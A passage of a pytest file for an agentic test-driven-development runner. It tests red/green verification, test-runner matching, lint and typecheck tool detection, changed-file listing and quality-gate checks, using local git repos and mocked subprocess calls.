        sp_run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "commit", "-m", "base"], cwd=tmp_path, capture_output=True, check=True)

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"command": "bun test", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "timeouts": {"test_run": 10},
        })

        # Simulate a realistic runner output where the scaffold marker comes
        # AFTER 500+ characters of banner/traceback noise.
        padding = "bun test v1.2.3 (abcdef)\n" + ("  at internal/runner/frame:line\n" * 30)
        assert len(padding) > 500
        red_stdout = padding + "TypeError: __setClientForTests is not a function\n"

        calls = {"count": 0}

        def fake_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list) and any("math.test.ts" in str(c) for c in cmd):
                calls["count"] += 1
                if calls["count"] == 1:
                    return subprocess.CompletedProcess(cmd, 1, stdout=red_stdout, stderr="")
                return subprocess.CompletedProcess(cmd, 0, stdout="1 pass\n", stderr="")
            return sp_run(*args, **kwargs)

        with mock_patch("subprocess.run", side_effect=fake_run):
            ok, msg = verify_red_green("src/math.test.ts")

        assert ok is False, "red phase with __setXForTests past char 500 must be rejected"
        assert "test scaffold is incomplete" in msg.lower()

    def test_verify_red_green_rejects_reference_error_is_not_defined(self, tmp_path, monkeypatch):
        """CodeRabbit (PR #13, comment 3106087624): ReferenceError / NameError
        around __setXForTests seams both produce the exact substring
        'is not defined' (TS: 'ReferenceError: __setClientForTests is not
        defined'; Python: \"NameError: name '__setClientForTests' is not
        defined\"). These are the same invalid-red-phase bug as the
        __setXForTests check, just a different runtime phrasing. Must be
        rejected, not verified."""
        from unittest.mock import patch as mock_patch
        from agentic_tdd_runner.agent import verify_red_green

        sp_run = subprocess.run
        sp_run([GIT, "init"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "config", "user.email", "test@test.com"], cwd=tmp_path, capture_output=True)
        sp_run([GIT, "config", "user.name", "test"], cwd=tmp_path, capture_output=True)
        src = tmp_path / "src"
        src.mkdir()
        (src / "math.ts").write_text("fixed")
        (src / "math.test.ts").write_text("test")
        sp_run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "commit", "-m", "base"], cwd=tmp_path, capture_output=True, check=True)

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"command": "bun test", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "timeouts": {"test_run": 10},
        })

        red_stdout = "ReferenceError: __setClientForTests is not defined\n"
        calls = {"count": 0}

        def fake_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list) and any("math.test.ts" in str(c) for c in cmd):
                calls["count"] += 1
                if calls["count"] == 1:
                    return subprocess.CompletedProcess(cmd, 1, stdout=red_stdout, stderr="")
                return subprocess.CompletedProcess(cmd, 0, stdout="1 pass\n", stderr="")
            return sp_run(*args, **kwargs)

        with mock_patch("subprocess.run", side_effect=fake_run):
            ok, msg = verify_red_green("src/math.test.ts")

        assert ok is False, "red phase with 'is not defined' around __setXForTests must be rejected"
        assert "test scaffold is incomplete" in msg.lower()

    @pytest.mark.parametrize(
        "stderr_text",
        [
            "/Applications/Xcode.app/Contents/Developer/usr/bin/python3: No module named pytest\n",
            "/Applications/Xcode.app/Contents/Developer/usr/bin/python3: No module named 'pytest'\n",
        ],
    )
    def test_verify_red_green_rejects_red_phase_when_pytest_is_missing(self, tmp_path, monkeypatch, stderr_text):
        """A red phase that fails because pytest is unavailable is infra failure,
        not proof that the bug was reproduced."""
        from unittest.mock import patch as mock_patch
        from agentic_tdd_runner.agent import verify_red_green

        sp_run = subprocess.run
        sp_run([GIT, "init"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "config", "user.email", "test@test.com"], cwd=tmp_path, capture_output=True)
        sp_run([GIT, "config", "user.name", "test"], cwd=tmp_path, capture_output=True)
        src = tmp_path / "src"
        src.mkdir()
        (src / "worker.py").write_text("def process(x):\n    return x\n")
        (src / "test_worker.py").write_text("def test_process():\n    assert True\n")
        sp_run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "commit", "-m", "base"], cwd=tmp_path, capture_output=True, check=True)

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"command": "bun test", "test_file_patterns": ["test_*.py"], "exclude_dirs": []},
            "timeouts": {"test_run": 10},
        })

        calls = {"count": 0}

        def fake_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list) and any("test_worker.py" in str(c) for c in cmd):
                calls["count"] += 1
                if calls["count"] == 1:
                    return subprocess.CompletedProcess(
                        cmd,
                        1,
                        stdout="",
                        stderr=stderr_text,
                    )
                return subprocess.CompletedProcess(cmd, 0, stdout="1 passed\n", stderr="")
            return sp_run(*args, **kwargs)

        with mock_patch("subprocess.run", side_effect=fake_run):
            ok, msg = verify_red_green("src/test_worker.py")

        assert ok is False
        assert "verification environment is broken" in msg.lower()
        assert "pytest is unavailable" in msg.lower()

    @pytest.mark.parametrize("phase", ["red", "green"])
    def test_verify_red_green_rejects_missing_runner_binary(self, tmp_path, monkeypatch, phase):
        """A missing runner binary must reject verification as infra failure,
        not crash the agent."""
        from unittest.mock import patch as mock_patch
        from agentic_tdd_runner.agent import verify_red_green

        sp_run = subprocess.run
        sp_run([GIT, "init"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "config", "user.email", "test@test.com"], cwd=tmp_path, capture_output=True)
        sp_run([GIT, "config", "user.name", "test"], cwd=tmp_path, capture_output=True)
        src = tmp_path / "src"
        src.mkdir()
        (src / "math.ts").write_text("fixed")
        (src / "math.test.ts").write_text("test")
        sp_run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "commit", "-m", "base"], cwd=tmp_path, capture_output=True, check=True)

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"command": "bun test", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "timeouts": {"test_run": 10},
        })

        calls = {"count": 0}

        def fake_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list) and cmd and cmd[0] == "bun" and any("math.test.ts" in str(c) for c in cmd):
                calls["count"] += 1
                if phase == "red" or calls["count"] > 1:
                    raise FileNotFoundError(2, "No such file or directory", "bun")
                return subprocess.CompletedProcess(cmd, 1, stdout="red failure\n", stderr="")
            return sp_run(*args, **kwargs)

        with mock_patch("subprocess.run", side_effect=fake_run):
            ok, msg = verify_red_green("src/math.test.ts")

        assert ok is False
        assert "verification environment is broken" in msg.lower()
        assert "bun is unavailable" in msg.lower()

    def test_verify_red_green_rejects_missing_pytest_binary(self, tmp_path, monkeypatch):
        """A missing pytest binary should map to the same infra-failure path."""
        from unittest.mock import patch as mock_patch
        from agentic_tdd_runner.agent import verify_red_green

        sp_run = subprocess.run
        sp_run([GIT, "init"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "config", "user.email", "test@test.com"], cwd=tmp_path, capture_output=True)
        sp_run([GIT, "config", "user.name", "test"], cwd=tmp_path, capture_output=True)
        src = tmp_path / "src"
        src.mkdir()
        (src / "math.ts").write_text("export const x = 1;\n")
        (src / "math.test.ts").write_text("test('smoke', () => expect(true).toBe(true));\n")
        sp_run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "commit", "-m", "base"], cwd=tmp_path, capture_output=True, check=True)

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"command": "pytest", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "timeouts": {"test_run": 10},
        })

        calls = {"count": 0}

        def fake_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list) and cmd and cmd[0] == "pytest" and any("math.test.ts" in str(c) for c in cmd):
                calls["count"] += 1
                if calls["count"] == 1:
                    raise FileNotFoundError(2, "No such file or directory", "pytest")
                return subprocess.CompletedProcess(cmd, 0, stdout="1 passed\n", stderr="")
            return sp_run(*args, **kwargs)

        with mock_patch("subprocess.run", side_effect=fake_run):
            ok, msg = verify_red_green("src/math.test.ts")

        assert ok is False
        assert "verification environment is broken" in msg.lower()
        assert "pytest is unavailable" in msg.lower()

    def test_verify_red_green_does_not_flag_green_infra_markers_after_success(self, tmp_path, monkeypatch):
        """A passing green phase should not be rejected just because the output
        contains text that looks like an infra marker."""
        from unittest.mock import patch as mock_patch
        from agentic_tdd_runner.agent import verify_red_green

        sp_run = subprocess.run
        sp_run([GIT, "init"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "config", "user.email", "test@test.com"], cwd=tmp_path, capture_output=True)
        sp_run([GIT, "config", "user.name", "test"], cwd=tmp_path, capture_output=True)
        src = tmp_path / "src"
        src.mkdir()
        (src / "math.ts").write_text("fixed")
        (src / "math.test.ts").write_text("test")
        sp_run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        sp_run([GIT, "commit", "-m", "base"], cwd=tmp_path, capture_output=True, check=True)

        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"command": "bun test", "test_file_patterns": ["*.test.ts"], "exclude_dirs": []},
            "timeouts": {"test_run": 10},
        })

        calls = {"count": 0}

        def fake_run(*args, **kwargs):
            cmd = args[0] if args else kwargs.get("args", [])
            if isinstance(cmd, list) and cmd and cmd[0] == "bun" and any("math.test.ts" in str(c) for c in cmd):
                calls["count"] += 1
                if calls["count"] == 1:
                    return subprocess.CompletedProcess(cmd, 1, stdout="red failure\n", stderr="")
                return subprocess.CompletedProcess(cmd, 0, stdout="note: previous log mentioned bun: command not found\n", stderr="")
            return sp_run(*args, **kwargs)

        with mock_patch("subprocess.run", side_effect=fake_run):
            ok, msg = verify_red_green("src/math.test.ts")

        assert ok is True
        assert "verified" in msg.lower()

    def test_finds_tsx_test_file(self, tmp_path, monkeypatch):
        self._setup_git_repo(tmp_path)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "widget.test.tsx").write_text("test")
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {"test_file_patterns": ["*.test.ts", "*.test.tsx"], "exclude_dirs": []},
        })
        assert find_test_file() == "src/widget.test.tsx"


class TestIsTestPass:
    """_is_test_pass should match real test runner commands, not substrings."""

    def test_matches_tokenized_test_runner_prefix(self, monkeypatch):
        monkeypatch.setattr("agentic_tdd_runner.agent._last_run_exit_code", 0)
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "runner": {
                "command": "bun test",
                "test_file_patterns": ["test_*.py"],
            },
        })
        assert _is_test_pass("run_command", {"command": "python3 -m pytest tests/test_agent.py"}) is True

    def test_matches_configured_runner_prefix(self, monkeypatch):
        monkeypatch.setattr("agentic_tdd_runner.agent._last_run_exit_code", 0)
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {"runner": {"command": "pnpm test"}})
        assert _is_test_pass("run_command", {"command": "pnpm test src/file.test.ts"}) is True

    def test_rejects_substring_false_positive(self, monkeypatch):
        monkeypatch.setattr("agentic_tdd_runner.agent._last_run_exit_code", 0)
        assert _is_test_pass("run_command", {"command": "grep pytest README.md"}) is False


class TestIsTestFilePath:
    """Fallback test filename heuristics should avoid broad substring matches."""

    def test_fallback_accepts_conventional_test_name(self, monkeypatch):
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {"runner": {"test_file_patterns": []}})
        assert _is_test_file_path("src/test_worker.py") is True

    def test_fallback_rejects_non_test_substring_name(self, monkeypatch):
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {"runner": {"test_file_patterns": []}})
        assert _is_test_file_path("src/contest.py") is False


class TestDetectQualityTools:
    """detect_quality_tools reads package.json/pyproject.toml to find lint/format tools."""

    def test_detects_biome_from_package_json(self, tmp_path, monkeypatch):
        import json
        (tmp_path / "package.json").write_text(json.dumps({
            "devDependencies": {"@biomejs/biome": "^2.0"},
            "scripts": {"lint": "biome check src", "typecheck": "tsc --noEmit"},
        }))
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        checks = detect_quality_tools("typescript")
        names = [c["name"] for c in checks]
        assert "typecheck" in names
        assert "lint" in names
        lint_cmd = next(c for c in checks if c["name"] == "lint")
        assert "biome" in lint_cmd["command"]
        assert "eslint" not in lint_cmd["command"]

    def test_detects_eslint_and_prettier(self, tmp_path, monkeypatch):
        import json
        (tmp_path / "package.json").write_text(json.dumps({
            "devDependencies": {"eslint": "^9.0", "prettier": "^3.0"},
            "scripts": {"typecheck": "tsc --noEmit"},
        }))
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        checks = detect_quality_tools("typescript")
        names = [c["name"] for c in checks]
        assert "lint" in names
        assert "format" in names
        lint_cmd = next(c for c in checks if c["name"] == "lint")
        assert "eslint" in lint_cmd["command"]
        format_cmd = next(c for c in checks if c["name"] == "format")
        assert "prettier" in format_cmd["command"]

    def test_detects_ruff_from_pyproject(self, tmp_path, monkeypatch):
        (tmp_path / "pyproject.toml").write_text('[tool.ruff]\nline-length = 88\n')
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        checks = detect_quality_tools("python")
        names = [c["name"] for c in checks]
        assert "lint" in names
        lint_cmd = next(c for c in checks if c["name"] == "lint")
        assert "ruff" in lint_cmd["command"]

    def test_returns_empty_when_no_tools_found(self, tmp_path, monkeypatch):
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        checks = detect_quality_tools("typescript")
        assert isinstance(checks, list)

    @pytest.mark.parametrize("lockfile,expected_cmd", [
        ("pnpm-lock.yaml", "pnpm run typecheck"),
        ("yarn.lock", "yarn run typecheck"),
        ("bun.lock", "bun run typecheck"),
        (None, "npm run typecheck"),
    ])
    def test_uses_package_json_scripts_via_detected_pm(
        self, tmp_path, monkeypatch, lockfile, expected_cmd,
    ):
        """scripts.typecheck is invoked by name via the detected package manager."""
        import json
        (tmp_path / "package.json").write_text(json.dumps({
            "scripts": {"typecheck": "vue-tsc --noEmit"},
        }))
        if lockfile:
            (tmp_path / lockfile).touch()
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        checks = detect_quality_tools("typescript")
        tc = next((c for c in checks if c["name"] == "typecheck"), None)
        assert tc is not None
        assert tc["command"] == expected_cmd

    @pytest.mark.parametrize("pm_field,expected_pm", [
        ("pnpm@8.6.0", "pnpm"),
        ("yarn@4.1.0", "yarn"),
        ("bun@1.2.0", "bun"),
        ("npm@10.0.0", "npm"),
    ])
    def test_packagemanager_field_takes_priority_over_lockfile(
        self, tmp_path, monkeypatch, pm_field, expected_pm,
    ):
        """packageManager in package.json wins over lockfiles."""
        import json
        (tmp_path / "package.json").write_text(json.dumps({
            "scripts": {"typecheck": "vue-tsc --noEmit"},
            "packageManager": pm_field,
        }))
        (tmp_path / "yarn.lock").touch()
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        checks = detect_quality_tools("typescript")
        tc = next((c for c in checks if c["name"] == "typecheck"), None)
        assert tc is not None
        assert tc["command"] == f"{expected_pm} run typecheck"

    @pytest.mark.parametrize("lockfile,expected_prefix", [
        ("pnpm-lock.yaml", "pnpm exec"),
        ("yarn.lock", "yarn"),
        ("bun.lock", "bunx"),
        (None, "npx"),
    ])
    def test_fallback_tools_use_detected_package_manager(
        self, tmp_path, monkeypatch, lockfile, expected_prefix,
    ):
        """Fallback binaries should use the detected package manager, not hardcoded npx."""
        import json
        (tmp_path / "package.json").write_text(json.dumps({
            "devDependencies": {
                "typescript": "^5.0",
                "eslint": "^9.0",
                "prettier": "^3.0",
            },
        }))
        if lockfile:
            (tmp_path / lockfile).touch()
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))

        checks = detect_quality_tools("typescript")

        by_name = {check["name"]: check for check in checks}
        assert by_name["typecheck"]["command"] == f"{expected_prefix} tsc --noEmit"
        assert by_name["lint"]["command"] == f"{expected_prefix} eslint {{changed_files}}"
        assert by_name["lint"]["fix"] == f"{expected_prefix} eslint {{changed_files}} --fix"
        assert by_name["format"]["command"] == (
            f"{expected_prefix} prettier --check {{changed_files}}"
        )
        assert by_name["format"]["fix"] == f"{expected_prefix} prettier --write {{changed_files}}"

    def test_biome_fallback_uses_detected_package_manager(self, tmp_path, monkeypatch):
        import json
        (tmp_path / "package.json").write_text(json.dumps({
            "packageManager": "pnpm@8.6.0",
            "devDependencies": {
                "@biomejs/biome": "^2.0",
                "typescript": "^5.0",
            },
        }))
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))

        checks = detect_quality_tools("typescript")

        by_name = {check["name"]: check for check in checks}
        assert by_name["typecheck"]["command"] == "pnpm exec tsc --noEmit"
        assert by_name["lint"]["command"] == "pnpm exec biome check {changed_files}"
        assert by_name["lint"]["fix"] == "pnpm exec biome check {changed_files} --fix"


class TestTypecheckOwnershipHint:
    """Typecheck ownership should not misattribute common basenames."""

    def test_matches_exact_changed_path(self):
        msg = _typecheck_ownership_hint(
            "typecheck",
            "src/file.ts(1,1): error TS2322: broken\n",
            ["src/file.ts"],
        )
        assert msg is not None
        assert "belongs to this fix" in msg

    def test_matches_unique_basename_when_output_omits_directory(self):
        msg = _typecheck_ownership_hint(
            "typecheck",
            "file.ts(1,1): error TS2322: broken\n",
            ["src/file.ts"],
        )
        assert msg is not None
        assert "belongs to this fix" in msg

    def test_rejects_ambiguous_basename_when_output_omits_directory(self):
        msg = _typecheck_ownership_hint(
            "typecheck",
            "file.ts(1,1): error TS2322: broken\n",
            ["src/file.ts", "tests/file.ts"],
        )
        assert msg is None

    def test_rejects_directory_path_when_only_basename_matches(self):
        msg = _typecheck_ownership_hint(
            "typecheck",
            "other/file.ts(1,1): error TS2322: broken\n",
            ["src/file.ts"],
        )
        assert msg is None


class TestGetChangedFiles:
    """_get_changed_files returns modified + staged + untracked files."""

    def _init_repo(self, tmp_path):
        subprocess.run([GIT, "init"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "config", "user.email", "t@t"], cwd=tmp_path, capture_output=True)
        subprocess.run([GIT, "config", "user.name", "t"], cwd=tmp_path, capture_output=True)

    def test_returns_modified_and_untracked(self, tmp_path, monkeypatch):
        self._init_repo(tmp_path)
        (tmp_path / "tracked.ts").write_text("original")
        subprocess.run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "commit", "-m", "init"], cwd=tmp_path, capture_output=True, check=True)
        (tmp_path / "tracked.ts").write_text("modified")
        (tmp_path / "new.ts").write_text("new")
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        files = _get_changed_files()
        assert "tracked.ts" in files
        assert "new.ts" in files

    def test_includes_staged_files(self, tmp_path, monkeypatch):
        self._init_repo(tmp_path)
        (tmp_path / "initial.ts").write_text("original")
        subprocess.run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "commit", "-m", "init"], cwd=tmp_path, capture_output=True, check=True)
        (tmp_path / "initial.ts").write_text("staged change")
        subprocess.run([GIT, "add", "initial.ts"], cwd=tmp_path, capture_output=True, check=True)
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        files = _get_changed_files()
        assert "initial.ts" in files, "Staged files must be included in quality gate"

    def test_excludes_deleted_files(self, tmp_path, monkeypatch):
        self._init_repo(tmp_path)
        (tmp_path / "keep.ts").write_text("keep")
        (tmp_path / "deleted.ts").write_text("gone soon")
        subprocess.run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "commit", "-m", "init"], cwd=tmp_path, capture_output=True, check=True)
        (tmp_path / "deleted.ts").unlink()
        (tmp_path / "keep.ts").write_text("modified")
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))
        files = _get_changed_files()
        assert "keep.ts" in files
        assert "deleted.ts" not in files


class TestRunQualityChecks:
    """run_quality_checks enforces lint, format, and forbidden patterns."""

    def _setup_repo(self, tmp_path, monkeypatch):
        subprocess.run([GIT, "init"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "config", "user.email", "t@t"], cwd=tmp_path, capture_output=True)
        subprocess.run([GIT, "config", "user.name", "t"], cwd=tmp_path, capture_output=True)
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "file.ts").write_text("original")
        subprocess.run([GIT, "add", "-A"], cwd=tmp_path, capture_output=True, check=True)
        subprocess.run([GIT, "commit", "-m", "init"], cwd=tmp_path, capture_output=True, check=True)
        monkeypatch.setattr("agentic_tdd_runner.agent.WORKDIR", str(tmp_path))

    def test_passes_when_disabled(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {"enabled": False},
            "timeouts": {"tool_execution": 10},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is True

    def test_detects_forbidden_pattern(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        (tmp_path / "src" / "file.test.ts").write_text("const x = {} as any;")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": ["as any"]},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is False
        assert "as any" in msg

    def test_detects_colon_any_as_forbidden_pattern(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        (tmp_path / "src" / "file.test.ts").write_text("function f(x: any) { return x; }")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": ["as any", ": any"]},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is False
        assert ": any" in msg

    def test_rejects_production_test_only_setter_exports(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        (tmp_path / "src" / "file.ts").write_text(
            "export function __setClientForTests(client: unknown): void {\n"
            "  void client;\n"
            "}\n"
        )
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": []},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is False
        assert "test-only production export" in msg
        assert "src/file.ts:1" in msg

    def test_passes_clean_code(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        (tmp_path / "src" / "file.test.ts").write_text("const x: number = 1;")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {"checks": [], "forbidden": ["as any"]},
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is True

    def test_runs_check_command_and_reports_failure(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        (tmp_path / "src" / "file.test.ts").write_text("clean")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {
                    "checks": [{"name": "lint", "command": "false"}],
                    "forbidden": [],
                },
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is False
        assert "lint" in msg

    def test_check_failure_shows_multiline_error_context(self, tmp_path, monkeypatch):
        """tsc errors span multiple lines; quality gate must show continuation lines
        so the model sees type names like SubUserstate without exploring node_modules."""
        self._setup_repo(tmp_path, monkeypatch)
        (tmp_path / "src" / "file.test.ts").write_text("clean")

        tsc_output = (
            "src/file.ts(123,10): error TS2769: No overload matches this call.\n"
            "  Overload 1 of 2, '(event: \"resub\", listener: (..., "
            "userstate: SubUserstate, methods: SubMethods) => void): Client'\n"
            "  gave the following error.\n"
            "    Argument of type '(a: string) => void' is not assignable.\n"
        )
        # Write a script that emits the tsc output and exits 1
        script = tmp_path / "fake-tsc.sh"
        script.write_text(f"#!/bin/sh\ncat <<'TSCEOF'\n{tsc_output}TSCEOF\nexit 1\n")
        script.chmod(0o755)

        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {
                    "checks": [{"name": "typecheck", "command": str(script)}],
                    "forbidden": [],
                },
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is False
        assert "SubUserstate" in msg, f"Type name from continuation line missing: {msg}"
        assert "SubMethods" in msg

    def test_check_failure_shows_all_errors_not_just_three(self, tmp_path, monkeypatch):
        """Quality gate must not truncate to 3 error lines when there are more."""
        self._setup_repo(tmp_path, monkeypatch)
        (tmp_path / "src" / "file.test.ts").write_text("clean")

        errors = "\n".join(
            f"src/file.ts({i},1): error TS{2000+i}: problem {i}"
            for i in range(1, 8)
        )
        script = tmp_path / "fake-tsc.sh"
        script.write_text(f"#!/bin/sh\ncat <<'TSCEOF'\n{errors}\nTSCEOF\nexit 1\n")
        script.chmod(0o755)

        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {
                    "checks": [{"name": "typecheck", "command": str(script)}],
                    "forbidden": [],
                },
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is False
        for i in range(1, 8):
            assert f"TS{2000+i}" in msg, f"error TS{2000+i} was truncated: {msg}"

    def test_typecheck_failure_marks_changed_file_as_owned(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        (tmp_path / "src" / "file.ts").write_text("changed")
        (tmp_path / "src" / "file.test.ts").write_text("clean")

        script = tmp_path / "fake-tsc.sh"
        script.write_text(
            "#!/bin/sh\n"
            "echo 'src/file.ts(1,1): error TS2322: Type mismatch'\n"
            "exit 1\n"
        )
        script.chmod(0o755)

        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {
                    "checks": [{"name": "typecheck", "command": str(script)}],
                    "forbidden": [],
                },
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })

        ok, msg = run_quality_checks("src/file.test.ts")

        assert ok is False
        assert "belongs to this fix" in msg
        assert "Do not classify it as unrelated" in msg

    def test_runs_fix_before_check(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        bad_file = tmp_path / "src" / "file.test.ts"
        bad_file.write_text("UNFIXED")
        fix_cmd = f"echo FIXED > {bad_file}"
        check_cmd = f"grep FIXED {bad_file}"
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {
                    "checks": [{"name": "format", "command": check_cmd, "fix": fix_cmd}],
                    "forbidden": [],
                },
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/file.test.ts")
        assert ok is True

    def test_quotes_changed_filenames_in_shell_commands(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        spaced_file = tmp_path / "src" / "my file.test.ts"
        spaced_file.write_text("clean")
        monkeypatch.setattr("agentic_tdd_runner.agent._CONFIG", {
            "quality": {
                "enabled": True, "max_fix_rounds": 3,
                "typescript": {
                    "checks": [{"name": "lint", "command": "cat {changed_files} >/dev/null"}],
                    "forbidden": [],
                },
            },
            "timeouts": {"tool_execution": 10},
            "prompt": {"quality_failed": "FAIL: {details}"},
        })
        ok, msg = run_quality_checks("src/my file.test.ts")
        assert ok is True

    def test_detects_duplicated_setup_lines(self, tmp_path, monkeypatch):
        self._setup_repo(tmp_path, monkeypatch)
        test_file = tmp_path / "src" / "file.test.ts"
        test_file.write_text(
            "describe('x', () => {\n"
            "  test('a', () => {\n"
            "    const spy = mock(() => {});\n"
            "    __setClient(spy);\n"
            "    doThing();\n"
            "  });\n"
            "  test('b', () => {\n"
            "    const spy = mock(() => {});\n"
            "    __setClient(spy);\n"
            "    doOther();\n"
            "  });\n"
            "  test('c', () => {\n"
            "    const spy = mock(() => {});\n"
            "    __setClient(spy);\n"
            "    doAnother();\n"
